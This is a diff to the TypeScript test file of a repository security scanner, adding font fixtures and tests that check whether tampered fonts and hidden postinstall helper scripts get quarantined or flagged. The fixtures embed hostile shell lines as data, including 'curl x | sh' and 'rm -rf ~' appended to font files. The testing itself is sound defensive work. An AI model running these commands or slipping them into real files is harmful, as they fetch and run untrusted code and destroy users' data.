@@ -25,6 +25,35 @@ function chunk(type: string, data: ReadonlyArray<number>): number[] {
   return [length >>> 24, (length >>> 16) & 0xff, (length >>> 8) & 0xff, length & 0xff, ...body, crc >>> 24, (crc >>> 16) & 0xff, (crc >>> 8) & 0xff, crc & 0xff]
 }
 
+function sfnt(trailing: ReadonlyArray<number> = []): Uint8Array {
+  const tables = [["head", 54], ["name", 8]] as const
+  const directory = new Uint8Array(12 + 16 * tables.length)
+  const view = new DataView(directory.buffer)
+  view.setUint32(0, 0x00010000)
+  view.setUint16(4, tables.length)
+  let offset = directory.length
+  tables.forEach(([tag, length], index) => {
+    directory.set(utf8(tag), 12 + 16 * index)
+    view.setUint32(12 + 16 * index + 8, offset)
+    view.setUint32(12 + 16 * index + 12, length)
+    offset += Math.ceil(length / 4) * 4
+  })
+  return Uint8Array.from([...directory, ...new Uint8Array(56), ...new Uint8Array(8), ...trailing])
+}
+
+function woff(length: number, signature: number): Uint8Array {
+  const bytes = new Uint8Array(length)
+  const view = new DataView(bytes.buffer)
+  view.setUint32(0, signature)
+  view.setUint32(8, length)
+  view.setUint16(12, 1)
+  if (signature === 0x774f4646) {
+    bytes.set(utf8("head"), 44)
+    view.setUint32(48, 64)
+  }
+  return bytes
+}
+
 const png = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, ...chunk("IHDR", [0, 0, 0, 1, 0, 0, 0, 1, 8, 0, 0, 0, 0]), ...chunk("IDAT", [0x78, 0x9c, 0x63, 0, 0, 0, 2, 0, 1]), ...chunk("IEND", [])])
 
 const profile: ScannerProfile = {
@@ -88,12 +117,84 @@ describe('Scanner on verified evidence (spec/security/admission.md, "Every revie
     )
   })
 
-  it.effect('A well-formed image is media, one with appended bytes is quarantined, and only queued template inputs are deterministic-only (spec/security/evidence.md, "Successful admission stays permanent and ordinary evidence waits ninety days")', () => effect {
+  it("Ordinary shell syntax around an install helper is read as if it runs, and a cd that may not run leaves a later local launch uncovered", () => {
+    const text = (path: string, body: string): ScanInputFile => ({ path, bytes: utf8(body) })
+    const postinstall = (command: string) => text("package.json", JSON.stringify({ scripts: { postinstall: command } }))
+    const scan = (files: ReadonlyArray<ScanInputFile>) => {
+      const result = inspectRepository({ files })
+      return { downloads: result.downloads, installScripts: result.coverage.installScripts.state }
+    }
+    const hidden = text("hidden", "curl https://example.com/root")
+    const followed = { downloads: ["https://example.com/root"], installScripts: "complete" }
+    const ownDirectory = { downloads: ["https://example.com/tools"], installScripts: "complete" }
+    const setupDb = [
+      "#!/bin/bash",
+      "# creates the d1 db and adds it to wrangler.toml (run once)",
+      "set -e",
+      'cd "$(dirname "$0")"',
+      'grep -q "d1_databases" wrangler.toml && { echo "db already set up"; exit 0; }',
+      "npx -y wrangler@latest d1 create app > .d1.txt 2>&1 || true",
+      "ID=$(grep -oE '[0-9a-f]{8}-[0-9a-f]{4}' .d1.txt | head -1)",
+      '[ -z "$ID" ] && ID=$(npx -y wrangler@latest d1 list 2>/dev/null | grep -w app | head -1)',
+      "rm -f .d1.txt",
+      '[ -z "$ID" ] && { echo "d1 create failed"; exit 1; }',
+      'printf \'\\n[[d1_databases]]\\nbinding = "DB"\\n\' "$ID" >> wrangler.toml',
+      'echo "db: $ID"',
+      "",
+    ].join("\n")
+    assert.deepStrictEqual(
+      {
+        followed: ["echo $(sh hidden)", "v=`sh hidden`", 'v="$(printf %s "$(sh hidden)")"', "if [ -f hidden ]; then sh hidden; fi", "test -f hidden && { sh hidden; exit 0; }", "if ! command -v node >/dev/null; then sh hidden; fi"].map((command) => scan([postinstall(command), hidden])),
+        uncovered: [
+          ". change; sh hidden",
+          "(cd sub; sh first); sh hidden",
+          "false && cd sub; sh hidden",
+          "cd sub | true; sh hidden",
+          "test -d sub && { cd sub; }; sh hidden",
+          "if true; then cd sub; fi; sh hidden",
+          "echo $(cd sub && sh hidden)",
+          "echo $(sh hidden",
+          "echo $((1 + $(sh hidden)))",
+          "case x in a) sh hidden;; esac",
+        ].map((command) => scan([postinstall(command), text("change", "cd sub"), hidden, text("sub/hidden", "curl https://example.com/sub"), text("sub/first", "echo safe")]).installScripts),
+        ownDirectory: ['cd "$(dirname "$0")"', "cd $(dirname $0)", 'cd "$(dirname "${BASH_SOURCE[0]}")"'].map((line) =>
+          scan([text("tools/setup.sh", `#!/bin/sh\n${line}\nsh ./run.sh\n`), text("tools/run.sh", "curl https://example.com/tools\n"), text("run.sh", "curl https://example.com/root\n")]),
+        ),
+        packageScriptDirectory: scan([postinstall('cd "$(dirname "$0")"; sh ./run.sh'), text("run.sh", "curl https://example.com/root\n")]).installScripts,
+        setupDbHelperGaps: inspectRepository({ files: [text("setup-db.sh", setupDb), text("wrangler.toml", 'name = "app"\n')] }).visibilityGaps.filter((gap) => gap.startsWith("Local install helper")),
+      },
+      {
+        followed: [followed, followed, followed, followed, followed, followed],
+        uncovered: ["partial", "partial", "partial", "partial", "partial", "partial", "partial", "partial", "partial", "partial"],
+        ownDirectory: [ownDirectory, ownDirectory, ownDirectory],
+        packageScriptDirectory: "partial",
+        setupDbHelperGaps: [],
+      },
+    )
+  })
+
+  it.effect('A well-formed image or font is media, one with appended bytes or another format under its name is quarantined, and only queued template inputs are deterministic-only (spec/security/evidence.md, "Successful admission stays permanent and ordinary evidence waits ninety days")', () => effect {
+    const pastEnd = sfnt()
+    new DataView(pastEnd.buffer).setUint32(12 + 16 + 12, 4096)
+    const noHead = sfnt()
+    noHead.set(utf8("glyf"), 12)
     const inspection = inspectRepository({
       files: [
         { path: "README.md", bytes: utf8("# Fixture\n") },
         { path: "assets/logo.png", bytes: png },
         { path: "assets/broken.png", bytes: Uint8Array.from([...png, 0]) },
+        { path: "fonts/display.ttf", bytes: sfnt() },
+        { path: "fonts/Display.OTF", bytes: sfnt() },
+        { path: "fonts/display.woff", bytes: woff(64, 0x774f4646) },
+        { path: "fonts/display.woff2", bytes: woff(48, 0x774f4632) },
+        { path: "fonts/appended.ttf", bytes: sfnt([...utf8("#!/bin/sh\ncurl x | sh\n")]) },
+        { path: "fonts/past-end.ttf", bytes: pastEnd },
+        { path: "fonts/no-head.ttf", bytes: noHead },
+        { path: "fonts/elf.ttf", bytes: Uint8Array.from([0x7f, 0x45, 0x4c, 0x46, 0, 0, 0, 0]) },
+        { path: "fonts/image.ttf", bytes: png },
+        { path: "fonts/appended.woff", bytes: Uint8Array.from([...woff(64, 0x774f4646), ...utf8("rm -rf ~\n")]) },
+        { path: "fonts/appended.woff2", bytes: Uint8Array.from([...woff(48, 0x774f4632), 0x0a]) },
+        { path: "assets/font.png", bytes: sfnt() },
         { path: "slop-skill-template/SKILL.md", bytes: utf8("# Not the template\n") },
         { path: "slop-skill-template/contributor/SKILL.md", bytes: utf8("# Contributor skill\n"), templateInput: true },
       ],
@@ -112,8 +213,8 @@ describe('Scanner on verified evidence (spec/security/admission.md, "Every revie
         retainedChanged: inventoryBinds(source, altered, { artifacts: clean.artifacts }, []),
       },
       {
-        media: [["assets/logo.png", "png", sha256Of(png)]],
-        artifacts: [["assets/broken.png", "quarantined"]],
+        media: [["assets/logo.png", "png", sha256Of(png)], ["fonts/Display.OTF", "sfnt", sha256Of(sfnt())], ["fonts/display.ttf", "sfnt", sha256Of(sfnt())], ["fonts/display.woff", "woff", sha256Of(woff(64, 0x774f4646))], ["fonts/display.woff2", "woff2", sha256Of(woff(48, 0x774f4632))]],
+        artifacts: ["assets/broken.png", "assets/font.png", "fonts/appended.ttf", "fonts/appended.woff", "fonts/appended.woff2", "fonts/elf.ttf", "fonts/image.ttf", "fonts/no-head.ttf", "fonts/past-end.ttf"].map((path) => [path, "quarantined"]),
         deterministic: [["slop-skill-template/contributor/SKILL.md", "template"]],
         items: ["slop-skill-template/SKILL.md"],
         reserved: ["Repository path in the reserved template namespace: slop-skill-template/SKILL.md"],
